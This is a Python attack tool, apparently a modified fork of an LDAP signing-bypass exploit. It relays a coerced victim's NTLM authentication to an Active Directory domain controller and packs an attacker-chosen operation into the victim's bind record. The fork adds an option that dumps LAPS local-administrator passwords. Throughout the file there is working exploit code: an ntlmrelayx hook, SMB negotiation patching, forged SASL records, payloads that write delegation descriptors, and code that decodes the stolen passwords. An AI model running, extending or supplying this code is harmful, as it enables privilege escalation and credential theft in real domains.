#!/usr/bin/env python3
"""
Switcheroo - LDAP signing bypass during reauthentication (SpecterOps, Oct 2026)

Original concept: relay a victim's NTLM Type 3 into a single SASL record that
also carries an attacker-chosen LDAP operation, signed with the attacker's
own session key. The DC verifies the SASL signature against the attacker's
key (because that's the key the bind was opened with) but executes the second
operation in the record as the victim (because the bind completed inside the
same record).

Modified fork: added `-read-laps` payload option. Instead of writing
RBCD / shadow-creds / arbitrary attribute, it issues a base-scope SearchRequest
that asks for every known LAPS attribute of `-modify-dn`. The SearchRequest is
packed into the same single SASL record as the victim Bind, so the dump runs
as the victim under the signing bypass -- no need for LDAP signing to be
disabled and no need for channel binding to be off.

NOTE on imports:
    The original Switcheroo tool ships with a "pruned" / pinned impacket tree
    that may not expose all of ldapasn1's class names (SearchRequest, Filter,
    Scope, DerefAliases, Present, Attributes, AttributeDescription). To stay
    compatible with that pruned tree, this fork does NOT import any of those
    class names from impacket.ldap.ldapasn1. Instead, it constructs the
    SearchRequest using raw pyasn1 primitives (which is what impacket itself
    uses internally). The only ldapasn1 names we still import are the ones
    the original tool already uses (BindRequest, LDAPMessage, ModifyRequest,
    ResultCode) -- those are guaranteed to be present.
"""

import argparse
import os
import random
import runpy
import shutil
import socket
import struct
import sys
import time
from struct import unpack

from impacket.examples.utils import parse_target
from impacket import ntlm
from impacket.examples.ntlmrelayx import clients as relay_clients
from impacket.examples.ntlmrelayx.clients import ldaprelayclient
from impacket.examples.ntlmrelayx.attacks.ldapattack import create_allow_ace, create_empty_sd
from impacket.ldap.ldap import LDAPConnection
try:
    # The original Switcheroo tool depends on this helper. Some pruned trees
    # may not expose it -- we only use it inside _verify() for write operations,
    # so a missing import degrades that path gracefully instead of crashing
    # the whole tool at startup.
    from impacket.ldap.ldap import get_entry_values
except ImportError:
    get_entry_values = None
from impacket.ldap.ldapasn1 import BindRequest, LDAPMessage, ModifyRequest, ResultCode
from impacket.nt_errors import STATUS_ACCESS_DENIED
from impacket.spnego import SPNEGO_NegTokenInit, SPNEGO_NegTokenResp, TypesMech
from pyasn1.codec.ber import decoder, encoder
from pyasn1.type import univ, namedtype, tag, namedval


# LAPS attribute names we ask for. Both legacy Microsoft LAPS (ms-Mcs-*) and
# the newer Windows LAPS (msLAPS-*) attributes are included so the dump works
# against either deployment.
LAPS_ATTRS = [
    "ms-Mcs-AdmPwd",                       # legacy LAPS, cleartext
    "ms-Mcs-AdmPwdExpirationTime",
    "msLAPS-Password",                     # Windows LAPS cleartext (when not encrypted)
    "msLAPS-EncryptedPassword",            # Windows LAPS encrypted blob
    "msLAPS-PasswordHistory",
    "msLAPS-EncryptedPasswordHistory",
    "msLAPS-EncryptedDSRMPassword",
    "msLAPS-DSRMPassword",
    "msLAPS-UserName",
    "msLAPS-PasswordExpirationTime",
    "msLAPS-PasswordSettings",
]


# ---------------------------------------------------------------------------
# Local pyasn1 definitions for SearchRequest.
#
# We define these locally rather than importing from impacket.ldap.ldapasn1
# because some pinned / pruned impacket trees (e.g. the one bundled with
# SpecterOps' Switcheroo) don't expose SearchRequest, Filter, Scope,
# DerefAliases, Present, Attributes, AttributeDescription. Building them
# here from raw pyasn1 keeps the tool compatible with those trees.
#
# The tag values below come straight from RFC 4511:
#   SearchRequest ::= [APPLICATION 3] SEQUENCE { ... }
#   Filter CHOICE: present [7] AttributeDescription  (we only need this one)
# ---------------------------------------------------------------------------

# LDAPString (RFC 4511) -- just an OCTET STRING.
class LDAPString(univ.OctetString):
    pass


# AttributeDescription is an LDAPString.
class AttributeDescription(LDAPString):
    pass


# Scope and DerefAliases are ENUMERATED types.
class Scope(univ.Enumerated):
    namedValues = namedval.NamedValues(
        ("baseObject", 0),
        ("singleLevel", 1),
        ("wholeSubtree", 2),
    )


class DerefAliases(univ.Enumerated):
    namedValues = namedval.NamedValues(
        ("neverDerefAliases", 0),
        ("derefInSearching", 1),
        ("derefFindingBaseObj", 2),
        ("derefAlways", 3),
    )


# Present filter: [7] IMPLICIT AttributeDescription.
class Present(AttributeDescription):
    tagSet = AttributeDescription.tagSet.tagExplicitly(
        tag.Tag(tag.tagClassContext, tag.tagFormatSimple, 7)
    )


# Filter CHOICE. We only need the "present" alternative for our base-scope
# (objectClass=*) search. Defining a minimal Filter is enough -- pyasn1 will
# only encode the alternative that's actually set.
class Filter(univ.Choice):
    pass


Filter.componentType = namedtype.NamedTypes(
    namedtype.NamedType("present", Present()),
)


# AttributeSelection ::= SEQUENCE OF LDAPString.
class AttributeSelection(univ.SequenceOf):
    componentType = LDAPString()


# SearchRequest ::= [APPLICATION 3] IMPLICIT SEQUENCE { ... }
# The [APPLICATION 3] tag REPLACES (not adds to) the universal SEQUENCE tag.
# This matches impacket's own definition (which uses tagImplicitly), so the
# resulting tagSet matches what LDAPMessage.protocolOp's Choice looks for.
class SearchRequest(univ.Sequence):
    tagSet = univ.Sequence.tagSet.tagImplicitly(
        tag.Tag(tag.tagClassApplication, tag.tagFormatConstructed, 3)
    )
    componentType = namedtype.NamedTypes(
        namedtype.NamedType("baseObject", univ.OctetString()),
        namedtype.NamedType("scope", Scope()),
        namedtype.NamedType("derefAliases", DerefAliases()),
        namedtype.NamedType("sizeLimit", univ.Integer()),
        namedtype.NamedType("timeLimit", univ.Integer()),
        namedtype.NamedType("typesOnly", univ.Boolean()),
        namedtype.NamedType("filter", Filter()),
        namedtype.NamedType("attributes", AttributeSelection()),
    )


def build_parser():
    parser = argparse.ArgumentParser(
        add_help=True,
        description="Switcheroo - LDAP signing bypass during reauthentication",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument(
        "target", action="store",
        help="[[domain/]username[:password]@]<targetName or address> - the attacker-controlled "
             "account that opens the initial signed LDAP connection, and the target DC",
    )
    parser.add_argument("-ts", action="store_true",
                         help="adds a timestamp to every logging output")
    parser.add_argument("-debug", action="store_true",
                         help="turn DEBUG output ON")

    group = parser.add_argument_group("authentication")
    group.add_argument("-hashes", action="store", metavar="LMHASH:NTHASH",
                       help="NTLM hashes for the attacker account, format LMHASH:NTHASH")
    group.add_argument("-no-pass", action="store_true",
                       help="don't ask for password (useful with -hashes)")
    group.add_argument("-dc-ip", action="store", metavar="ip address",
                       help="IP address of the target DC. If omitted, the targetName from the "
                            "target argument is used")
    group.add_argument("-base-dn", action="store", metavar="DN", required=True,
                       help="search base, e.g. DC=example,DC=com")

    group = parser.add_argument_group("relay listener")
    group.add_argument("-ntlmrelayx", action="store", metavar="PATH",
                       help="path to ntlmrelayx.py from the pinned Impacket tree "
                            "(default: search PATH)")
    group.add_argument("-listen-ip", action="store", metavar="ip address", required=True,
                       help="attacker listener IP the coerced victim connects to")
    group.add_argument("-victim", action="store", metavar="DOMAIN/account",
                       help="only relay this victim; others are rejected")

    group = parser.add_argument_group("attack (operation executed as the victim)")
    group.add_argument("-modify-dn", action="store", metavar="DN", required=True,
                       help="DN of the directory object to operate on as the victim "
                            "(write target, OR LAPS read target when -read-laps is used)")
    group.add_argument("-attribute", action="store", default="description",
                       help="attribute to write with -value/-value-hex (default: description)")
    payload = group.add_mutually_exclusive_group(required=True)
    payload.add_argument("-value", action="store",
                         help="UTF-8 attribute value")
    payload.add_argument("-value-hex", action="store",
                         help="binary attribute value as hex")
    payload.add_argument("-rbcd-sid", action="store", metavar="SID",
                         help="write an RBCD descriptor granting this SID "
                              "(msDS-AllowedToActOnBehalfOfOtherIdentity)")
    payload.add_argument("-read-laps", action="store_true",
                         help="read LAPS attributes from -modify-dn instead of writing")
    return parser


args = build_parser().parse_args()

# domain/username:password@targetName  (Impacket-style credential + target parsing).
# Logging/banner are left to ntlmrelayx (run below) to avoid duplicate handlers.
domain, username, password, address = parse_target(args.target)
if not username:
    sys.exit("[-] username is required: domain/username[:password]@host")
lmhash = nthash = ""
if args.hashes:
    lmhash, _, nthash = args.hashes.partition(":")
if not password and not nthash and not args.no_pass:
    from getpass import getpass
    password = getpass("Password:")

# Normalise to the names the rest of the script uses.
ldap_host = address
ldap_ip = args.dc_ip or address
expected_victim = args.victim.replace("/", "\\") if args.victim else None


def configure_smb_listener():
    """Make ntlmrelayx's SMB server advertise signing-required / SMB 3.1.1 so the
    victim performs a signed SMB handshake (closer to real coercion targets)."""
    from impacket.examples.ntlmrelayx.servers import smbrelayserver
    from impacket import smb3

    original = smbrelayserver.SMBRelayServer.SmbNegotiate

    def negotiate(self, conn_id, smb_server, request, isSMB1=False):
        result = original(self, conn_id, smb_server, request, isSMB1)
        if not result or not result[1]:
            return result
        response = result[1][0]["Data"]
        response["SecurityMode"] = (
            smb3.SMB2_NEGOTIATE_SIGNING_ENABLED | smb3.SMB2_NEGOTIATE_SIGNING_REQUIRED
        )
        if isSMB1:
            # Steer the client onto the SMB2 wildcard so it follows up with a
            # context-bearing SMB2 Negotiate instead of locking to SMB 2.0.2.
            response["DialectRevision"] = smb3.SMB2_DIALECT_WILDCARD
            response["NegotiateContextCount"] = 0
            response["NegotiateContextOffset"] = 0
            return result

        preauth_data = struct.pack("<HHH", 1, 32, 1) + os.urandom(32)
        preauth = struct.pack(
            "<HHI", smb3.SMB2_PREAUTH_INTEGRITY_CAPABILITIES, len(preauth_data), 0
        ) + preauth_data
        response["DialectRevision"] = smb3.SMB2_DIALECT_311
        response["NegotiateContextCount"] = 1
        context_offset = (0x80 + len(response["Buffer"]) + 7) & ~7
        response["NegotiateContextOffset"] = context_offset
        response["Padding"] = b"\x00" * (context_offset - 0x80 - len(response["Buffer"]))
        response["NegotiateContextList"] = preauth
        return result

    smbrelayserver.SMBRelayServer.SmbNegotiate = negotiate


def resolve_ntlmrelayx():
    for candidate in (args.ntlmrelayx, shutil.which("ntlmrelayx.py"), shutil.which("ntlmrelayx")):
        if candidate and os.path.isfile(candidate):
            return os.path.abspath(candidate)
    raise SystemExit("ntlmrelayx.py not found; pass --ntlmrelayx /path/to/ntlmrelayx.py")


def ldap_message(operation):
    """Wrap an LDAP operation (ModifyRequest OR our local SearchRequest) into an
    LDAPMessage envelope. Works for any object with a getTagSet() method, so our
    locally-defined SearchRequest passes through cleanly -- LDAPMessage.protocolOp
    is a CHOICE that already includes searchRequest [APPLICATION 3], and our
    SearchRequest is tagged exactly the same way."""
    message = LDAPMessage()
    message["messageID"] = random.randrange(1, 2147483647)
    message["protocolOp"].setComponentByType(operation.getTagSet(), operation)
    return encoder.encode(message)


def gss_token(token):
    """Wrap a raw SPNEGO token in an LDAP SASL (GSS-SPNEGO) BindRequest."""
    request = BindRequest()
    request["version"] = 3
    request["name"] = ""
    request["authentication"]["sasl"]["mechanism"] = "GSS-SPNEGO"
    request["authentication"]["sasl"]["credentials"] = token
    return request


def operation_value():
    """Return (attribute, value) for the attacker-chosen ModifyRequest."""
    if args.rbcd_sid:
        descriptor = create_empty_sd()
        descriptor["Dacl"].aces.append(create_allow_ace(args.rbcd_sid))
        return "msDS-AllowedToActOnBehalfOfOtherIdentity", descriptor.getData()
    if args.value_hex:
        return args.attribute, bytes.fromhex(args.value_hex)
    return args.attribute, args.value.encode()


def replace_attribute(attribute, value):
    request = ModifyRequest()
    request["object"] = args.modify_dn
    request["changes"][0]["operation"] = 2  # replace
    request["changes"][0]["modification"]["type"] = attribute
    request["changes"][0]["modification"]["vals"].setComponents(value)
    return request


def build_laps_search_request(target_dn):
    """Build a base-scope SearchRequest asking for all LAPS attributes of target_dn.

    Returns a local SearchRequest object (built from raw pyasn1 primitives, see
    the top of this file) that has the same wire encoding as impacket's
    SearchRequest. It can be wrapped in LDAPMessage via ldap_message().
    """
    request = SearchRequest()
    request["baseObject"] = target_dn
    request["scope"] = Scope("baseObject")          # 0
    request["derefAliases"] = DerefAliases("neverDerefAliases")
    request["sizeLimit"] = 0
    request["timeLimit"] = 0
    request["typesOnly"] = False

    # Set the present filter (objectClass=*). pyasn1 CHOICE assignment: build the
    # Filter Choice object explicitly first, set its 'present' alternative, then
    # assign the whole Filter to the SearchRequest. Direct `request["filter"] =
    # Present(...)` fails with tag-incompatible -- pyasn1 needs the wrapping Choice.
    filter_obj = Filter()
    filter_obj.setComponentByName("present", Present("objectClass"))
    request["filter"] = filter_obj

    attrs = AttributeSelection()
    for attr in LAPS_ATTRS:
        attrs.append(LDAPString(attr))
    request["attributes"] = attrs
    return request


def print_laps_value(attr, value):
    """Render a single LAPS attribute value in a human-readable way."""
    if isinstance(value, str):
        value = value.encode()
    if attr == "ms-Mcs-AdmPwd":
        # Legacy LAPS - cleartext password, ASCII/UTF-8.
        try:
            print(f"     {attr}: {value.decode()}", flush=True)
        except UnicodeDecodeError:
            print(f"     {attr} (hex): {value.hex()}", flush=True)
    elif attr.startswith("msLAPS-Encrypted"):
        # Windows LAPS encrypted blob - decryptable only with the DC's key
        # (or a delegated reader's). Show the raw hex head for triage/offline
        # decryption with lapsdecrypter.py / impacket laps.py / laps-toolkit.
        head = value[:64].hex()
        suffix = "..." if len(value) > 64 else ""
        print(f"     {attr} ({len(value)} bytes, hex head): {head}{suffix}", flush=True)
    elif attr == "msLAPS-Password":
        # Windows LAPS cleartext variant - usually UTF-16LE on the wire.
        for codec in ("utf-16le", "utf-8"):
            try:
                print(f"     {attr}: {value.decode(codec)}", flush=True)
                return
            except UnicodeDecodeError:
                continue
        print(f"     {attr} (hex): {value.hex()}", flush=True)
    elif attr.endswith("ExpirationTime"):
        # 64-bit FILETIME (100ns ticks since 1601-01-01).
        try:
            if len(value) == 8:
                ticks = int.from_bytes(value, "little", signed=True)
                if ticks in (0, -1):
                    print(f"     {attr}: (not set)", flush=True)
                else:
                    epoch = (ticks - 116444736000000000) // 10000000
                    from datetime import datetime, timezone
                    ts = datetime.fromtimestamp(epoch, tz=timezone.utc).isoformat()
                    print(f"     {attr}: {ts} (raw {ticks})", flush=True)
            else:
                print(f"     {attr} (raw hex): {value.hex()}", flush=True)
        except Exception:
            print(f"     {attr} (hex): {value.hex()}", flush=True)
    else:
        # Generic: try UTF-8, fall back to hex.
        try:
            print(f"     {attr}: {value.decode()}", flush=True)
        except UnicodeDecodeError:
            print(f"     {attr} (hex): {value.hex()}", flush=True)


def read_exact(sock, length):
    value = b""
    while len(value) < length:
        chunk = sock.recv(length - len(value))
        if not chunk:
            raise EOFError("connection closed")
        value += chunk
    return value


class CrossUserLDAPRelayClient(ldaprelayclient.LDAPSRelayClient):
    """ntlmrelayx LDAP client that drives the same-record bypass.

    The relay client opens the attacker's own signed LDAP session (its key
    is known to us), forwards the victim's NTLM Type 1/2/3 through it, and on
    Type 3 packs the final victim Bind and an attacker-chosen operation into
    a single SASL record signed with the attacker's key.
    """

    def initConnection(self):
        # The attacker's own signed LDAP session; its session key is known to us.
        self.raw = LDAPConnection(
            f"ldap://{ldap_host}", args.base_dn,
            dstIp=ldap_ip, signing=True, timeout=8,
        )
        self.raw.login(username, password, domain, lmhash, nthash, authenticationChoice="sasl")
        print(f"[+] Initial signed LDAP identity: {domain}\\{username}", flush=True)
        # Log the exported SASL session key of our own connection -- the key we sign
        # the same-record frame with, and the key the DC verifies that frame under.
        try:
            cipher = self.raw._LDAPConnection__spnego_cipher_blob
            key = getattr(cipher, "_SPNEGOCipher__randomSessionKey", None) or \
                  getattr(cipher, "randomSessionKey", None)
            if key:
                print(f"[key] attacker exported session key: {bytes(key).hex()}", flush=True)
        except Exception:
            pass
        self.session = self.raw
        return True

    def sendNegotiate(self, negotiateMessage):
        # Forward the victim's NTLM Type 1 to the DC in a GSS-SPNEGO Bind and relay
        # back the DC's Type 2 challenge unchanged.
        type1 = ntlm.NTLMAuthNegotiate()
        type1.fromString(negotiateMessage)
        blob = SPNEGO_NegTokenInit()
        blob["MechTypes"] = [TypesMech["NTLMSSP - Microsoft NTLM Security Support Provider"]]
        blob["MechToken"] = type1.getData()

        type1_request = gss_token(blob.getData())
        answer = self.raw.sendReceive(type1_request)
        result = answer[0]["protocolOp"]["bindResponse"]
        code = int(result["resultCode"])
        if code != int(ResultCode("saslBindInProgress")):
            raise RuntimeError(f"GSS-SPNEGO Type 1 rejected: {ResultCode(code).prettyPrint()}")
        target_spnego = SPNEGO_NegTokenResp(result["serverSaslCreds"].asOctets())
        challenge = ntlm.NTLMAuthChallenge()
        challenge.fromString(target_spnego["ResponseToken"])
        print("[+] Relayed DC Type 2 challenge back to the victim", flush=True)
        return challenge

    def sendAuth(self, authenticateMessageBlob, serverChallenge=None):
        # The victim's NTLM Type 3 arrives here. Place the final victim Bind and the
        # attacker's chosen operation (ModifyRequest OR SearchRequest for LAPS) into
        # ONE SASL record signed with the attacker's key.
        token = authenticateMessageBlob
        if unpack("B", token[:1])[0] == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
            token = SPNEGO_NegTokenResp(token)["ResponseToken"]
        type3 = ntlm.NTLMAuthChallengeResponse()
        type3.fromString(token)
        encoding = "utf-16le" if type3["flags"] & ntlm.NTLMSSP_NEGOTIATE_UNICODE else "ascii"
        victim = "%s\\%s" % (
            type3["domain_name"].decode(encoding),
            type3["user_name"].decode(encoding),
        )
        if expected_victim and victim.casefold() != expected_victim.casefold():
            print(f"[-] Rejected unexpected victim {victim}", flush=True)
            return None, STATUS_ACCESS_DENIED

        final = SPNEGO_NegTokenResp()
        final["ResponseToken"] = token
        if len(authenticateMessageBlob) >= 20 and authenticateMessageBlob[-20:-16] == b"\xa3\x12\x04\x10":
            final["mechListMIC"] = authenticateMessageBlob[-16:]

        bind_message = ldap_message(gss_token(final.getData()))

        is_read = bool(args.read_laps)
        if is_read:
            op_message = ldap_message(build_laps_search_request(args.modify_dn))
            op_label = "SearchRequest(LAPS)"
            write_attribute = None
            write_value = None
        else:
            write_attribute, write_value = operation_value()
            op_message = ldap_message(replace_attribute(write_attribute, write_value))
            op_label = f"ModifyRequest({write_attribute})"

        # The two messages, concatenated, protected as a single SASL record with the
        # attacker's own session key. This is the crux of the bypass.
        record = bind_message + op_message
        wire = self.raw.encrypt(record)
        self.raw._socket.sendall(wire)
        print(f"[+] Sent same-record frame: victim={victim} op={op_label} "
              f"dn={args.modify_dn}", flush=True)

        # Read SASL records until we receive the final operation response.
        # The DC may pack Bind + operation responses into a single SASL record
        # or split them across records; we handle both by looping until we see
        # modifyResponse or searchResDone.
        #
        # IMPORTANT: We add a socket timeout. A patched DC (October 2026 LDAP
        # signing fix, KB for Server 2016-2025) will accept the victim Bind
        # (the bind itself is properly signed with the attacker's session key)
        # but silently drop the second LDAP message in the SASL record because
        # its signature no longer matches the post-bind session key. The
        # connection stays open and the script would hang forever without a
        # timeout. If we time out waiting for the next record, that is a
        # strong signal the DC is patched.
        laps_results = {}
        final_seen = False
        bind_seen = False

        original_timeout = self.raw._socket.gettimeout()
        self.raw._socket.settimeout(15)  # 15s grace for the next SASL record
        try:
            while not final_seen:
                try:
                    length_bytes = read_exact(self.raw._socket, 4)
                    length = struct.unpack(">I", length_bytes)[0]
                    body = read_exact(self.raw._socket, length)
                    plaintext = self.raw.decrypt(struct.pack(">I", length) + body)
                except socket.timeout:
                    if bind_seen:
                        print(f"[!] timed out waiting for the operation response "
                              f"after Bind succeeded", flush=True)
                        print(f"[!] the DC accepted the victim Bind but is not "
                              f"sending a response to the {op_label}", flush=True)
                        print(f"[!] this is the textbook signature of the October "
                              f"2026 LDAP signing patch (or Server 2025 24H2 "
                              f"hardening): the second LDAP message in our SASL "
                              f"record is being silently dropped because its "
                              f"signature no longer matches the post-bind "
                              f"session key.", flush=True)
                        print(f"[!] check: Get-HotFix | Where-Object "
                              f"{{$_.InstalledOn -gt (Get-Date '2026-10-01')}}  "
                              f"-- if you see KB items from Oct 2026+, the DC "
                              f"is patched and the bypass will not work.", flush=True)
                    else:
                        print(f"[!] timed out waiting for any response from the DC "
                              f"(no Bind response either)", flush=True)
                    break
                except Exception as error:
                    print(f"[!] response unavailable: {type(error).__name__}: {error}",
                          flush=True)
                    break

                remainder = plaintext
                while remainder:
                    try:
                        # Decode with LDAPMessage as the spec so the protocolOp CHOICE
                        # is recognised; subsequent getComponent() picks the right
                        # alternative (bindResponse / searchResEntry / searchResDone /
                        # modifyResponse).
                        message, remainder = decoder.decode(remainder, asn1Spec=LDAPMessage())
                    except Exception as error:
                        print(f"[!] ASN.1 decode failed: {type(error).__name__}: {error}",
                              flush=True)
                        break

                    # getName() must be called on the CHOICE (protocolOp), not on the
                    # already-resolved component (BindResponse / searchResEntry / ...).
                    # The resolved components are Sequence subclasses without getName().
                    protocol_op = message["protocolOp"]
                    name = protocol_op.getName()
                    op = protocol_op.getComponent()

                    if name == "bindResponse":
                        bind_seen = True
                        print(f"[+]   Bind -> {op['resultCode'].prettyPrint()} "
                              f"{bytes(op['diagnosticMessage']).decode(errors='replace')[:80]}",
                              flush=True)
                    elif name == "searchResEntry":
                        for partial in op["attributes"]:
                            attr_name = str(partial["type"])
                            for val in partial["vals"]:
                                laps_results.setdefault(attr_name, []).append(val.asOctets())
                    elif name == "searchResDone":
                        final_seen = True
                        print(f"[+]   SearchDone -> {op['resultCode'].prettyPrint()} "
                              f"{bytes(op['diagnosticMessage']).decode(errors='replace')[:80]}",
                              flush=True)
                    elif name == "modifyResponse":
                        final_seen = True
                        print(f"[+]   Modify -> {op['resultCode'].prettyPrint()} "
                              f"{bytes(op['diagnosticMessage']).decode(errors='replace')[:80]}",
                              flush=True)
        finally:
            self.raw._socket.settimeout(original_timeout)

        if is_read:
            if laps_results:
                print(f"[+] LAPS DUMP for {args.modify_dn}:", flush=True)
                for attr, vals in laps_results.items():
                    for v in vals:
                        print_laps_value(attr, v)
            else:
                print(f"[-] No LAPS attributes returned - the victim lacks READ permission "
                      f"on the object, or LAPS is not configured on it.", flush=True)
        else:
            self._verify(write_attribute, write_value)

        # Close the victim's SMB exchange; relay/coercion tools may show FAILED anyway.
        return None, STATUS_ACCESS_DENIED

    def _verify(self, attribute, value):
        """Independent signed connection read-back -- the only reliable success signal
        for write operations. Skipped for LAPS reads (the dump itself is the result).

        Degrades gracefully if get_entry_values isn't available in this impacket
        tree -- in that case we just search for the attribute and check membership
        manually against the raw entry values.
        """
        if get_entry_values is None:
            print("[!] get_entry_values helper not available in this impacket tree; "
                  "skipping verification", flush=True)
            return
        time.sleep(1)
        try:
            check = LDAPConnection(
                f"ldap://{ldap_host}", args.base_dn,
                dstIp=ldap_ip, signing=True, timeout=8,
            )
            check.login(username, password, domain, lmhash, nthash, authenticationChoice="sasl")
            entries = check.search(
                searchBase=args.modify_dn, scope=0,
                searchFilter="(objectClass=*)", attributes=[attribute],
            )
            found = []
            for entry in entries:
                found.extend(item.asOctets() for item in get_entry_values(entry, attribute))
            check.close()
            if value in found:
                print("[+] SUCCESS: target object now contains the attacker value", flush=True)
            else:
                print("[-] target did not contain the requested value", flush=True)
        except Exception as error:
            print(f"[!] verification unavailable: {type(error).__name__}: {error}", flush=True)

    def killConnection(self):
        try:
            self.raw.close()
        except Exception:
            pass
        self.session = None


relay_clients.PROTOCOL_CLIENTS["LDAP"] = CrossUserLDAPRelayClient
configure_smb_listener()

# ntlmrelayx is invoked with NO attack-plugin flags (--dump-laps, --shadow-creds,
# --rbcd, etc.) because the same-record bypass runs the operation INSIDE sendAuth.
# The plugin system would try to open a new signed connection and run there,
# which would lose the bypass and just hit signing/channel-binding normally.
# All operation logic lives in CrossUserLDAPRelayClient above.
sys.argv = [
    "ntlmrelayx.py", "-t", f"ldap://{ldap_host}", "-ip", args.listen_ip,
    "-smb2support", "--no-multirelay", "--keep-relaying", "--no-http-server",
    "--no-wcf-server", "--no-raw-server", "--no-rpc-server",
    "--no-winrm-server", "--no-mssql-server", "--no-rdp-server",
]
if args.debug:
    sys.argv.append("-debug")
if args.ts:
    sys.argv.append("-ts")
runpy.run_path(resolve_ntlmrelayx(), run_name="__main__")
